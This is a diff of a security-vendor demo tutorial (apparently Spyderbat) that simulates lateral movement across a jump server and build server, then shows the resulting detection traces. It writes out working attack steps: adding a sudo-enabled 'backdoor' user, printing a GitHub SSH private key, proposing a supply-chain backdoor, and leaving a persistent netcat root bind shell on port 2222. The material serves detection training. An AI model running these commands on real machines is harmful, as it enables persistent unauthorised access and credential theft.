@@ -18,16 +18,28 @@ ssh -i ~/path/to/jumpserver/key JUMPSERVER_USER@JUMPSERVER_IP
 
 Let's take a look around to see what we can do:
 
+```sh
+id
 ```
-[ec2-user@jumpserver ~]$ id
-uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
-[ec2-user@jumpserver ~]$ sudo -l
+```
+uid=1000(ec2-user) gid=1000(ec2-user) groups=1000(ec2-user),4(adm),10(wheel),190(systemd-journal) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+```
+
+```sh
+sudo -l
+```
+
+```
 ...
 User ec2-user may run the following commands on jumpserver:
     (ALL) ALL
     (ALL) NOPASSWD: ALL
 ```
+
+> **Note:**
+> 
+> Your output may vary, depending on what user and permissions are available on the server.
 
 Looks like we have full sudo access to this machine (and we don't even need to know the password). So, let's make a new user to be able to get back into this machine, just in case the SSH key gets rotated. First, add the user:
 
@@ -40,6 +52,9 @@ Which we can now see in `/etc/passwd`:
 ```sh
 cat /etc/passwd | tail
 ```
+```
+backdoor:x:1001:1001::/home/backdoor:/bin/bash
+```
 
 To make sure we can get full access, let's add them to the sudoers file:
 
@@ -51,8 +66,6 @@ Next, let's change to that user to test it and prepare a login:
 
 ```sh
 sudo su backdoor
-```
-```sh
 sudo -l
 ```
 ```
@@ -172,7 +185,7 @@ history
    16  history
 ```
 
-Given that the build server is fetching private code using SSH, we could use the SSH keys here to log in to GitHub and view the company's repositories:
+Given that the build server is fetching private code using SSH, we could use the SSH keys here to log in to GitHub and view the company's repositories. First check for keys:
 
 ```sh
 ls ~/.ssh/
@@ -180,29 +193,42 @@ ls ~/.ssh/
 ```
 authorized_keys  github-login
 ```
+
+Then print out the interesting ones:
+
 ```sh
 cat ~/.ssh/github-login
 ```
 
-Next, let's take a look at the `payroll-app` directory to get some more details about how the new version deployment process is handled:
+Next, let's take a look at the `payroll-app` directory:
 
 ```sh
 ls ~/payroll-app/
 ```
+```
+dockerfile  Makefile  payroll-calc.conf  payroll-calc.py  requirements.txt
+```
+
+The Makefile might have some more details about how the new version deployment process is handled:
+
 ```sh
 cat payroll-app/Makefile
 ```
-
-Given the access on this machine, we could edit the `payroll-app` package to add a backdoor that we could access, and then push a new version of the package. Alternatively, we can set up a secondary backdoor method using Netcat. However, we will need to install it:
-
-If your machine is an Ubuntu-based OS:
-
-```sh
-sudo apt install ncat
 ```
-For AWS (or other Redhat based OSs):
+# ...
+push-container:
+	aws ecr-public get-login-password --region us-east-1 | docker login --username AWS --password-stdin public.ecr.aws/xxxxxxxx
+	docker tag payroll-calculator:latest public.ecr.aws/xxxxxxxx/payroll-calculator:latest
+	docker push public.ecr.aws/xxxxxxxx/payroll-calculator:latest
+```
+
+Given the access on this machine, we could edit the `payroll-app` package to add a backdoor that we could access, and then push a new version of the package, setting up a supply-chain attack. Alternatively, we can set up a secondary backdoor method using Netcat. However, we will need to install it:
+
 
 ```sh
+# If your machine is an Ubuntu-based OS:
+sudo apt install ncat
+# For AWS (or other Redhat based OSs):
 sudo yum install nmap-ncat
 ```
 
@@ -212,20 +238,22 @@ And validate that we can use `nc`:
 which nc
 ```
 
-We can start a listening port configured to connect us to a root shell, then disown the process so it stays around when we leave.
+To create the backdoor, we can start a listening port configured to connect us to a root shell, then disown the process so it stays around when we leave.
 
 ```sh
 sudo nc -l -p 2222 -e "/bin/bash" &
 disown
 ```
 
-On some machines, `nc` might error, saying that the `-e` flag doesn't exist. If that is the case, we'll need to use a FIFO pipe trick to get the input and output of netcat into a bash process:
-
-```sh
-mkfifo loop_pipe
-nc -l -p 2222 < loop_pipe | sudo /bin/bash > loop_pipe &
-disown
-```
+> **Note:**
+> 
+> On some machines, `nc` might error, saying that the `-e` flag doesn't exist. If that is the case, we'll need to use a FIFO pipe trick to get the input and output of netcat into a bash process:
+> 
+> ```sh
+> mkfifo loop_pipe
+> nc -l -p 2222 < loop_pipe | sudo /bin/bash > loop_pipe &
+> disown
+> ```
 
 If the network is open to the build box server, we can now reconnect from any machine. You can skip this next step if it does not work, as the demo machines may not be reachable on port 2222, depending on how they were originally created. 
 
@@ -256,11 +284,11 @@ To see a full supply-chain exploitation and how Spyderbat detects it, visit the 
 ## Investigation
 
 
-In the Spyderbat Console, navigate to the Dashboard page to begin our investigation. In the Security tab, under "Recent Spydertraces with Score > 50", a new trace should appear, likely named "interactive_ssh_from_[IP_ADDRESS]", or "suspicious_crud_command_cat". Select these Spydertraces, and select "Start Process Investigation" to see the events of the exploit laid out in a Causal Tree in the investigation view:
+In the Spyderbat Console, navigate to the Dashboard page to begin our investigation. In the Security tab, under "Recent Spydertraces with Score > 50", at least two new traces should appear, likely named "interactive_ssh_from_\[IP_ADDRESS]", or "suspicious_crud_command_cat". Select these Spydertraces, and select "Start Process Investigation" to see the events of the exploit laid out in a Causal Tree in the investigation view:
 
 ![An example of the resulting graph](./lateral_movement_external_graph.png)
 
-Your view should look similar to the trace above. If it does not, make sure you selected a Spydertrace object from both machines on the dashboard page. If you are still missing details, click the "Add Next X Objects" button on some of the traces listed in the records table next to the graph:
+Your view should look similar to the trace above, with two separate process trees. If it does not, make sure you selected a Spydertrace object from both machines on the dashboard page. If you are still missing details, click the "Add Next X Objects" button on some of the traces listed in the records table next to the graph:
 
 ![A view of the records table, showing the Add Next 18 Object button](./recordslist_example.png)
 
